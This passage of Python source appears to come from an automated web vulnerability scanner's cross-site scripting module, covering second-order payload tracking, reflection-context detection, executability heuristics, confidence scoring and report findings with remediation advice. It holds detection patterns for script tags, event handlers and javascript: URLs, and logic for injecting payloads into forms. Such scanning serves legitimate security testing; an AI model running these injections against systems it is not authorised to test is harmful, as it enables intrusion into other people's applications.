                response = await client.post(
                    url,
                    data=data,
                    headers=self._auth_headers,
                    timeout=10.0,
                )

            # Track the submission
            contains_marker = marker in response.text

            tracked = TrackedInput(
                submit_endpoint=url,
                submit_method="POST",
                field_name=field,
                payload=payload,
                payload_marker=marker,
                timestamp=time.time(),
                response_status=response.status_code,
                response_contains_marker=contains_marker,
            )

            logger.debug(
                f"[XSS-SECOND-ORDER] Submitted marker {marker} to {url}/{field} "
                f"(status={response.status_code}, reflected={contains_marker})"
            )

            return tracked

        except Exception as e:
            logger.debug(f"[XSS-SECOND-ORDER] Failed to submit to {url}: {e}")
            return None

    def _is_second_order_xss_executable(
        self, response_text: str, marker: str
    ) -> bool:
        """
        Check if marker appears in executable XSS context.

        Returns True if marker is in a context that would execute JavaScript.
        """
        if marker not in response_text:
            return False

        # Check for executable contexts around marker
        pos = response_text.find(marker)
        context_start = max(0, pos - 100)
        context_end = min(len(response_text), pos + len(marker) + 100)
        context = response_text[context_start:context_end]

        # Executable indicators
        executable_patterns = [
            r'<script[^>]*>.*' + re.escape(marker),
            r'onerror\s*=\s*["\']?[^"\']*' + re.escape(marker),
            r'onload\s*=\s*["\']?[^"\']*' + re.escape(marker),
            r'onfocus\s*=\s*["\']?[^"\']*' + re.escape(marker),
            r'onclick\s*=\s*["\']?[^"\']*' + re.escape(marker),
        ]

        for pattern in executable_patterns:
            if re.search(pattern, context, re.IGNORECASE | re.DOTALL):
                # Verify not HTML-encoded
                escaped_marker = html.escape(marker)
                if escaped_marker in context and marker not in context.replace(escaped_marker, ''):
                    continue
                return True

        return False

    def _build_url(self, host: str, path: str) -> str:
        """Build full URL from host and path."""
        if path.startswith("http"):
            return path
        base = self._base_url or self._resolve_base_url(host)
        if path.startswith("/"):
            return f"{base}{path}"
        return f"{base}/{path}"

    def _create_second_order_xss_finding(
        self,
        host: str,
        submit_endpoint: str,
        submit_field: str,
        render_location: str,
        payload: str,
        marker: str,
        response_snippet: str,
    ) -> dict:
        """Create CRITICAL finding for confirmed second-order XSS."""
        poc = ExploitationHelper.generate_xss_poc(
            url=submit_endpoint,
            parameter=submit_field,
            payload=payload,
            xss_type="second_order",
            context="cross_page",
        )

        evidence = [
            f"[SECOND-ORDER XSS CONFIRMED]",
            f"Payload submitted to: {submit_endpoint}",
            f"Field used: {submit_field}",
            f"Payload renders at: {render_location}",
            f"Unique marker: {marker}",
            f"Full payload: {payload}",
            f"Response snippet: {response_snippet[:200]}...",
            "[IMPACT] Payload stored in one location, executes in another (often admin panels)",
            "[IMPACT] Can target privileged users who view the data in different context",
        ]

        return Finding(
            vuln_type=VulnType.XSS_STORED,
            name="SECOND-ORDER XSS - Cross-Page Execution Confirmed",
            severity=Severity.CRITICAL,
            description=(
                f"**CRITICAL SECOND-ORDER XSS VULNERABILITY** detected. "
                f"Malicious JavaScript payload submitted to '{submit_endpoint}' (field: {submit_field}) "
                f"was found executing in a completely different location: '{render_location}'.\n\n"
                f"**Why This Is Dangerous:**\n"
                f"Second-order XSS is especially dangerous because:\n"
                f"1. Input validation at submission point may not detect the attack\n"
                f"2. Payload renders in different context (often admin/privileged pages)\n"
                f"3. Targets privileged users (admins viewing user data, support staff, etc.)\n"
                f"4. Often bypasses XSS filters focused on immediate reflection\n\n"
                f"**Attack Chain:**\n"
                f"1. Attacker submits XSS payload via {submit_endpoint}\n"
                f"2. Payload is stored without proper sanitization\n"
                f"3. Admin/Staff visits {render_location} to view user data\n"
                f"4. Payload executes in admin context → Account takeover\n\n"
                f"**Verification:** Unique marker '{marker}' confirmed at both locations."
            ),
            host=host,
            endpoint=submit_endpoint,
            evidence=evidence,
            cvss_score=9.0,
            cwe_id="CWE-79",
            confidence_score=95,
            remediation=(
                "**CRITICAL - IMMEDIATE ACTION REQUIRED:**\n\n"
                "1. **Output Encoding at EVERY Render Point:**\n"
                "   - Encode data when displaying, not just when storing\n"
                "   - Each render context may need different encoding\n"
                "   - Admin panels need same protection as public pages\n\n"
                "2. **Input Sanitization:**\n"
                "   - Sanitize on input as defense-in-depth\n"
                "   - But NEVER rely solely on input sanitization\n\n"
                "3. **Content Security Policy:**\n"
                "   - Apply strict CSP to ALL pages including admin\n"
                "   - Use nonces for any legitimate inline scripts\n\n"
                "4. **Admin Panel Hardening:**\n"
                "   - Extra scrutiny for pages rendering user data\n"
                "   - Consider rendering user content in sandboxed iframes\n"
            ),
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting/stored",
                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            ],
            metadata={
                "poc": poc.to_dict() if poc else {},
                "second_order_xss": True,
                "submit_endpoint": submit_endpoint,
                "submit_field": submit_field,
                "render_location": render_location,
                "marker": marker,
                "attack_chain": "submit_A → store → render_B → execute",
            },
        ).to_dict()

    def _generate_canary(self) -> str:
        """Generate unique canary for reflection detection."""
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"xss{random_part}canary"
    
    def _detect_context(self, html_content: str, canary: str) -> XSSContext:
        """Detect the context where input is reflected."""
        pos = html_content.find(canary)
        if pos == -1:
            return XSSContext.UNKNOWN
        
        # Get surrounding context
        start = max(0, pos - 100)
        end = min(len(html_content), pos + len(canary) + 100)
        context_str = html_content[start:end]
        
        # Check for various contexts
        before = html_content[start:pos]
        after = html_content[pos + len(canary):end]
        
        # JavaScript context
        if re.search(r'<script[^>]*>.*$', before, re.DOTALL | re.IGNORECASE):
            if "'" in before[-50:] and not '"' in before[-50:]:
                return XSSContext.JS_STRING_SINGLE
            elif '"' in before[-50:]:
                return XSSContext.JS_STRING
            elif '`' in before[-50:]:
                return XSSContext.JS_TEMPLATE
            return XSSContext.JS_BLOCK
        
        # Attribute context
        attr_double = re.search(r'=\s*"[^"]*$', before)
        attr_single = re.search(r"=\s*'[^']*$", before)
        attr_unquoted = re.search(r'=\s*[^\s"\'>]*$', before)
        
        if attr_double:
            return XSSContext.HTML_ATTRIBUTE
        if attr_single:
            return XSSContext.HTML_ATTRIBUTE_SINGLE
        if attr_unquoted and not attr_double and not attr_single:
            return XSSContext.HTML_ATTRIBUTE_UNQUOTED
        
        # URL context (href, src, action)
        if re.search(r'(?:href|src|action)\s*=\s*["\']?[^"\']*$', before, re.IGNORECASE):
            return XSSContext.URL_PARAM
        
        # CSS context
        if re.search(r'style\s*=\s*["\'][^"\']*$', before, re.IGNORECASE):
            return XSSContext.CSS_VALUE
        
        # SVG context
        if re.search(r'<svg[^>]*>.*$', before, re.DOTALL | re.IGNORECASE):
            return XSSContext.SVG_CONTEXT
        
        # Comment context
        if '<!--' in before and '-->' not in before:
            return XSSContext.COMMENT

        # Theme 11: Modern reactive framework contexts
        # Alpine.js: x-data, x-bind, x-on, @click, etc.
        if re.search(r'\sx-(?:data|bind|on|text|html|model|show|if|for|init)\s*=\s*["\'][^"\']*$', before, re.IGNORECASE):
            return XSSContext.ALPINE_DIRECTIVE
        if re.search(r'\s@(?:click|submit|input|change|keyup|keydown)\s*=\s*["\'][^"\']*$', before, re.IGNORECASE):
            return XSSContext.ALPINE_DIRECTIVE

        # HTMX: hx-get, hx-post, hx-trigger, hx-target, etc.
        if re.search(r'\shx-(?:get|post|put|patch|delete|trigger|target|swap|vals|headers)\s*=\s*["\'][^"\']*$', before, re.IGNORECASE):
            return XSSContext.HTMX_ATTRIBUTE

        # Vue.js: v-bind, v-on, :attr, @event, v-html, etc.
        if re.search(r'\sv-(?:bind|on|html|text|model|if|for|show)\s*[:=]\s*["\'][^"\']*$', before, re.IGNORECASE):
            return XSSContext.VUE_DIRECTIVE
        if re.search(r'\s[:@][\w-]+\s*=\s*["\'][^"\']*$', before):  # :class="..." or @click="..."
            return XSSContext.VUE_DIRECTIVE

        # Svelte: bind:value, on:click, etc.
        if re.search(r'\s(?:bind|on):[\w]+\s*=\s*["\'][^"\']*$', before, re.IGNORECASE):
            return XSSContext.SVELTE_BINDING

        # Angular: [property], (event), [(ngModel)], etc.
        if re.search(r'\s\[[\w.-]+\]\s*=\s*["\'][^"\']*$', before):
            return XSSContext.ANGULAR_BINDING
        if re.search(r'\s\([\w.-]+\)\s*=\s*["\'][^"\']*$', before):
            return XSSContext.ANGULAR_BINDING

        # Default to HTML text
        return XSSContext.HTML_TEXT
    
    def _get_payloads_for_context(self, context: XSSContext) -> list[str]:
        """Get appropriate payloads for detected context.

        2026-02-20: Now uses centralized PayloadLibrary first, with fallback to hardcoded.
        """
        # Try library first
        library_payloads = self._get_library_xss_payloads(context=context, max_payloads=20)

        # Get hardcoded fallback
        hardcoded_payloads = self.PAYLOADS_BY_CONTEXT.get(context, self.PAYLOADS_BY_CONTEXT[XSSContext.HTML_TEXT])

        # Combine: library first, then hardcoded (deduplicated)
        combined = library_payloads + [p for p in hardcoded_payloads if p not in library_payloads]
        return combined
    
    def _check_xss_reflection(self, html_content: str, payload: str) -> bool:
        """
        Check if XSS payload is reflected and executable.

        FIX 2026-02-16: Added HTML-encoded reflection detection.
        PHP apps using htmlspecialchars() encode <script> as &lt;script&gt;
        This was causing 0% detection on DVWA, bWAPP, Mutillidae.
        """
        # Direct reflection
        if payload in html_content:
            return self._is_payload_executable(html_content, payload)

        # Check URL decoded version
        decoded = unquote(payload)
        if decoded in html_content:
            return self._is_payload_executable(html_content, decoded)

        # Check HTML entity decoded (payload encoded, response has raw)
        html_decoded = html.unescape(payload)
        if html_decoded in html_content:
            return self._is_payload_executable(html_content, html_decoded)

        # FIX 2026-02-16: Check HTML-ENCODED version (payload raw, response has entities)
        # Critical for PHP apps using htmlspecialchars()
        # Example: payload "<script>" reflected as "&lt;script&gt;"
        html_encoded = html.escape(payload)
        if html_encoded in html_content:
            # HTML-encoded reflection - app encodes output (defense working)
            # Still report as reflected for awareness, lower confidence
            return True  # Reflected but encoded

        # Case-insensitive match (some apps transform case)
        if payload.lower() in html_content.lower():
            return self._is_payload_executable(html_content, payload)

        return False
    
    def _is_payload_executable(self, html_content: str, payload: str) -> bool:
        """
        Verify payload is in executable position (not just reflected as text).
        Anti-false-positive heuristic.

        FN-FIX 2026-02-08: Expanded detection to catch event handlers, attribute
        breakouts, and URL context XSS that were being missed.
        """
        html_lower = html_content.lower()
        payload_lower = payload.lower()

        # First check: is the payload reflected at all?
        pos = html_content.find(payload)
        if pos == -1:
            # Try case-insensitive and URL-decoded
            pos = html_lower.find(payload_lower)
            if pos == -1:
                from urllib.parse import unquote
                decoded_payload = unquote(payload)
                pos = html_content.find(decoded_payload)
                if pos == -1:
                    return False

        # Check if inside HTML comment
        before = html_content[:pos]
        if before.rfind('<!--') > before.rfind('-->'):
            return False

        # Check if HTML encoded by the app (true encoding = not executable)
        encoded_check = html.escape(payload)
        # Only reject if ONLY the encoded version exists
        if encoded_check in html_content and payload not in html_content:
            return False

        # FN-FIX: Comprehensive executable context detection
        # Check 1: Script/event handler indicators in the HTML response
        executable_indicators = [
            '<script', '</script', 'onerror=', 'onload=', 'onclick=',
            'onmouseover=', 'onfocus=', 'onblur=', 'onchange=', 'oninput=',
            'onsubmit=', 'onkeyup=', 'onkeydown=', 'onmousedown=', 'onmouseup=',
            'javascript:', 'data:text/html', 'data:text/javascript',
            'srcdoc=', 'src=', 'href=',
        ]

        # If payload contains an executable indicator AND it appears unencoded in response
        for indicator in executable_indicators:
            if indicator.lower() in payload_lower and indicator.lower() in html_lower:
                return True

        # Check 2: Attribute breakout detection
        # Payloads like "><img, '><script, " onfocus= break out of attributes
        breakout_patterns = [
            '"><', "'><", '" ', "' ", '">',  # Quote + bracket/space
            'autofocus', 'style=', 'class=',
        ]
        for pattern in breakout_patterns:
            if pattern.lower() in payload_lower:
                # Check if breakout succeeded (tag structure changed)
                if '><' in html_content[pos:pos+len(payload)+20]:
                    return True

        # Check 3: If the payload contains < or > and they're unencoded, likely executable
        if '<' in payload and '<' in html_content[pos:pos+len(payload)+5]:
            return True
        if '>' in payload and '>' in html_content[pos:pos+len(payload)+5]:
            return True

        # Check 4: Context-based heuristic - if reflected near event/src attributes
        snippet = html_content[max(0, pos-100):pos+len(payload)+100].lower()
        context_indicators = ['onclick', 'onerror', 'onload', 'src=', 'href=', 'action=']
        if any(ind in snippet for ind in context_indicators):
            return True

        # FN-FIX: Default to True if payload is reflected unencoded
        # Rationale: if we got here, payload is reflected raw - likely vulnerable
        # Better to have FP than FN for XSS (manual verification is easy)
        return True
    
    def _extract_reflection_snippet(self, html_content: str, payload: str) -> str:
        """Extract snippet around reflected payload."""
        pos = html_content.find(payload)
        if pos == -1:
            pos = html_content.find(unquote(payload))
        if pos == -1:
            return ""

        start = max(0, pos - 50)
        end = min(len(html_content), pos + len(payload) + 50)
        return html_content[start:end]

    def _analyze_reflection_advanced(
        self,
        payload: str,
        response_body: str,
        content_type: str = "",
    ) -> tuple[bool, EchoAnalysis | None, ConfidenceScore | None]:
        """
        Advanced reflection analysis using PayloadEchoDetector from response_analyzer.

        2026-02-20: Integrates sophisticated echo detection for better accuracy.
        Uses:
        - PayloadEchoDetector for reflection type classification
        - ConfidenceEngine for point-based scoring

        Returns:
            Tuple of (is_vulnerable, echo_analysis, confidence_score)
        """
        # Use PayloadEchoDetector for comprehensive reflection analysis
        echo_analysis = self.echo_detector.analyze(payload, response_body, content_type)

        # Early exit if not reflected at all
        if echo_analysis.echo_type == EchoType.NOT_REFLECTED:
            return False, echo_analysis, None

        # Calculate confidence using ConfidenceEngine
        confidence_score = self.confidence_engine.calculate(
            vuln_vuln_type=VulnType.XSS_REFLECTED,
                                    category=VulnCategory.INJECTION,
            response_body=response_body,
            echo_analysis=echo_analysis,
            extra_indicators={
                "payload_executed": echo_analysis.is_executable,
                "waf_blocked": False,  # Already checked upstream
            },
        )

        # Determine vulnerability based on echo type and context
        is_vulnerable = False

        # Additional check: is payload inside an HTML comment?
        # PayloadEchoDetector may miss complex comment patterns
        in_comment = self._is_payload_in_comment(response_body, payload)
        if in_comment:
            logger.debug("[XSS] Payload is inside HTML comment - not executable")
            return False, echo_analysis, confidence_score

        # RAW reflection in executable context = definitely vulnerable
        if echo_analysis.echo_type == EchoType.REFLECTED_RAW:
            if echo_analysis.is_executable:
                is_vulnerable = True
                logger.debug(
                    f"[XSS] RAW reflection in executable context: {echo_analysis.context}"
                )
            elif echo_analysis.context not in ("HTML comment", "Unknown context"):
                # Even if not explicitly marked executable, raw reflection is risky
                is_vulnerable = True

        # Reflection in JS context (even if escaped) could be dangerous
        elif echo_analysis.echo_type == EchoType.REFLECTED_IN_JS:
            is_vulnerable = True
            logger.debug("[XSS] Reflection in JavaScript context detected")

        # Attribute context reflection
        elif echo_analysis.echo_type == EchoType.REFLECTED_IN_ATTRIBUTE:
            # Check if it's an event handler or URL attribute
            dangerous_attrs = ["onclick", "onerror", "onload", "onmouseover", "href", "src"]
            if any(attr in echo_analysis.context.lower() for attr in dangerous_attrs):
                is_vulnerable = True

        # Escaped reflection is NOT vulnerable (application is properly encoding)
        elif echo_analysis.echo_type in (
            EchoType.REFLECTED_ESCAPED,
            EchoType.REFLECTED_URL_ENCODED,
            EchoType.REFLECTED_JSON_ESCAPED,
            EchoType.REFLECTED_IN_COMMENT,
        ):
            is_vulnerable = False
            logger.debug(
                f"[XSS] Reflection is properly escaped ({echo_analysis.escape_method})"
            )

        # Partial reflection - low confidence
        elif echo_analysis.echo_type == EchoType.REFLECTED_PARTIAL:
            # Only vulnerable if significant portion reflected raw
            if len(echo_analysis.reflected_value) > len(payload) * 0.7:
                is_vulnerable = True

        # Final check: use confidence level as tiebreaker
        if confidence_score.level.value >= ConfidenceLevel.MEDIUM.value:
            # High confidence from ConfidenceEngine reinforces detection
            if not is_vulnerable and confidence_score.total_score >= 70:
                is_vulnerable = True
                logger.debug(
                    f"[XSS] High confidence override: score={confidence_score.total_score}"
                )

        return is_vulnerable, echo_analysis, confidence_score

    def _check_xss_reflection_enhanced(
        self,
        html_content: str,
        payload: str,
        content_type: str = "",
    ) -> tuple[bool, EchoAnalysis | None]:
        """
        Enhanced XSS reflection check using advanced response analysis.

        2026-02-20: Combines original _check_xss_reflection logic with
        PayloadEchoDetector for more accurate context and escape detection.

        Returns:
            Tuple of (is_reflected_and_dangerous, echo_analysis)
        """
        # First try the advanced analysis
        is_vuln, echo_analysis, confidence = self._analyze_reflection_advanced(
            payload, html_content, content_type
        )

        if echo_analysis and echo_analysis.echo_type != EchoType.NOT_REFLECTED:
            return is_vuln, echo_analysis

        # Fallback: try URL decoded version
        decoded = unquote(payload)
        if decoded != payload:
            is_vuln, echo_analysis, confidence = self._analyze_reflection_advanced(
                decoded, html_content, content_type
            )
            if echo_analysis and echo_analysis.echo_type != EchoType.NOT_REFLECTED:
                return is_vuln, echo_analysis

        # Fallback: try HTML entity decoded version
        html_decoded = html.unescape(payload)
        if html_decoded != payload:
            is_vuln, echo_analysis, confidence = self._analyze_reflection_advanced(
                html_decoded, html_content, content_type
            )
            if echo_analysis and echo_analysis.echo_type != EchoType.NOT_REFLECTED:
                return is_vuln, echo_analysis

        return False, None

    def _is_payload_in_comment(self, html_content: str, payload: str) -> bool:
        """
        Check if payload is inside an HTML comment.

        2026-02-20: Additional check for comment context that PayloadEchoDetector
        may miss with complex payloads containing special characters.
        """
        pos = html_content.find(payload)
        if pos == -1:
            return False

        before = html_content[:pos]
        after = html_content[pos + len(payload):]

        # Find the last comment start before the payload
        last_comment_start = before.rfind('<!--')
        last_comment_end = before.rfind('-->')

        # If there's a comment start after the last comment end, we're in a comment
        if last_comment_start > last_comment_end:
            # Check if the comment closes after the payload
            next_comment_end = after.find('-->')
            if next_comment_end != -1:
                return True

        return False

    def _calculate_confidence(
        self,
        confirmations: int,
        context: XSSContext,
        waf_detected: bool,
        csp_present: bool,
        echo_analysis: EchoAnalysis | None = None,
        engine_score: ConfidenceScore | None = None,
    ) -> float:
        """
        Calculate confidence score (0-100).

        2026-02-20: Enhanced with optional echo_analysis and engine_score
        from PayloadEchoDetector and ConfidenceEngine integration.
        """
        base_confidence = 50.0

        # If we have a ConfidenceEngine score, use it as a strong signal
        if engine_score is not None and engine_score.total_score > 0:
            # Blend engine score with our calculation (engine weighted 40%)
            engine_normalized = min(engine_score.total_score, 100)
            base_confidence = (base_confidence * 0.6) + (engine_normalized * 0.4)

        # Confirmations boost (cross-validation)
        base_confidence += min(confirmations * 15, 30)

        # Context-based confidence
        high_confidence_contexts = [
            XSSContext.HTML_TEXT,
            XSSContext.JS_BLOCK,
            XSSContext.HTML_ATTRIBUTE,
        ]
        if context in high_confidence_contexts:
            base_confidence += 10

        # 2026-02-20: Enhanced confidence from echo analysis
        if echo_analysis:
            # Raw reflection in executable context is high confidence
            if echo_analysis.echo_type == EchoType.REFLECTED_RAW and echo_analysis.is_executable:
                base_confidence += 20
            # Raw reflection (any context) gets a boost
            elif echo_analysis.echo_type == EchoType.REFLECTED_RAW:
                base_confidence += 10
            # JavaScript context reflection
            elif echo_analysis.echo_type == EchoType.REFLECTED_IN_JS:
                base_confidence += 15
            # Properly escaped reflection reduces confidence
            elif echo_analysis.echo_type in (
                EchoType.REFLECTED_ESCAPED,
                EchoType.REFLECTED_URL_ENCODED,
                EchoType.REFLECTED_JSON_ESCAPED,
            ):
                base_confidence -= 15
            # In comment = very low confidence
            elif echo_analysis.echo_type == EchoType.REFLECTED_IN_COMMENT:
                base_confidence -= 25

        # WAF bypass increases confidence
        if waf_detected:
            base_confidence += 10

        # CSP reduces exploitability but not vulnerability
        if csp_present:
            base_confidence -= 5
        
        return min(100, max(0, base_confidence))
    
    def _create_finding(
        self,
        result: XSSResult,
        url: str,
        param: str,
        injection_point: str,
    ) -> Finding:
        """Create Finding object from XSSResult."""
        parsed = urlparse(url)
        host = parsed.netloc
        
        severity = "HIGH"
        cvss = 6.1
        
        # Adjust severity based on context
        if result.context in [XSSContext.JS_BLOCK, XSSContext.HTML_TEXT]:
            severity = "HIGH"
            cvss = 7.1
        elif result.csp_present and not result.csp_bypassed:
            severity = "MEDIUM"
            cvss = 5.4
        
        evidence_list = [
            f"Parameter: {param}",
            f"Context: {result.context.name}",
            f"Payload: {result.payload}",
            f"Confidence: {result.confidence}%",
            f"WAF Detected: {result.waf_detected.value}",
            f"CSP Present: {result.csp_present}",
            f"Cross-Validations: {len(result.evidence)}",
        ]
        
        for ev in result.evidence[:3]:
            evidence_list.append(f"Reflection: {ev.response_snippet[:100]}...")
        
        # Generate POC with exploitation details
        xss_type = "reflected"
        if "stored" in injection_point.lower() or result.context == XSSContext.HTML_TEXT:
            xss_type = "stored" if "stored" in injection_point.lower() else "reflected"

        poc = ExploitationHelper.generate_xss_poc(
            url=url,
            parameter=param,
            payload=result.payload,
            xss_type=xss_type,
            context=result.context.name.lower(),
        )

        return Finding(
            vuln_type=VulnType.XSS_REFLECTED,
                                    category=VulnCategory.INJECTION,
            name=f"Reflected XSS ({result.context.name})",
            severity=severity,
            description=(
                f"Cross-Site Scripting vulnerability found in {injection_point} '{param}'. "
                f"User input is reflected in {result.context.name} context without proper sanitization. "
                f"This allows attackers to execute arbitrary JavaScript in the victim's browser. "
                f"Confidence: {result.confidence}% based on {len(result.evidence)} cross-validations."
            ),
            host=host,
            endpoint=f"{url}?{param}=",
            evidence=evidence_list,
            cvss_score=cvss,
            cwe_id="CWE-79",
            confidence_score=result.confidence,
            remediation=(
                "1. Implement context-aware output encoding:\n"
                "   - HTML context: HTML entity encoding\n"
                "   - JavaScript: JavaScript encoding\n"
                "   - URL: URL encoding\n"
                "   - CSS: CSS encoding\n"
                "2. Deploy Content-Security-Policy headers:\n"
                "   - Disable 'unsafe-inline' and 'unsafe-eval'\n"
                "   - Use nonce or hash-based CSP\n"
                "3. Use HTTPOnly and Secure flags on cookies\n"
                "4. Consider using auto-escaping template engines\n"
                "5. Validate and sanitize all user input"
            ),
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                "https://portswigger.net/web-security/cross-site-scripting",
                "https://cwe.mitre.org/data/definitions/79.html",
            ],
            metadata={"poc": poc.to_dict()},
        )

    def _create_finding_and_record(
        self,
        result: XSSResult,
        url: str,
        param: str,
        injection_point: str,
    ) -> Finding:
        """Create Finding object and record for second-order detection."""
        finding = self._create_finding(result, url, param, injection_point)

        # SECOND-ORDER (2026-02-20): Record input for cross-endpoint detection
        # Even though this finding was confirmed, the payload may also execute
        # at other locations (admin panels, reports, logs, etc.)
        self._record_second_order_input(
            endpoint=url,
            param_name=param,
            payload=result.payload,
            method="GET",
            response_status=200,  # Assume successful since finding was created
            response_contains_marker=True,  # It was reflected
        )

        return finding
